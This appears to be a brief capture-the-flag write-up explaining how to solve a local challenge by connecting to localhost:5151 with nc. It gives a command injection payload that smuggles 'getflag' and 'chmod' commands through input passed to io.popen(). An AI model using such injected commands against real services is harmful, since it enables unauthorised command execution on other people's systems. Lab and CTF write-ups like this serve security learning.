The server is listening on localhost:5151.

Connect to it with:

nc localhost 5151

Then send:

Im in; getflag > /tmp/flag; chmod 644 /tmp/flag; echo lol

This executes the getflag through the io.popen() function and returns the result
in a file on which we set the appropriate rights. There you go.
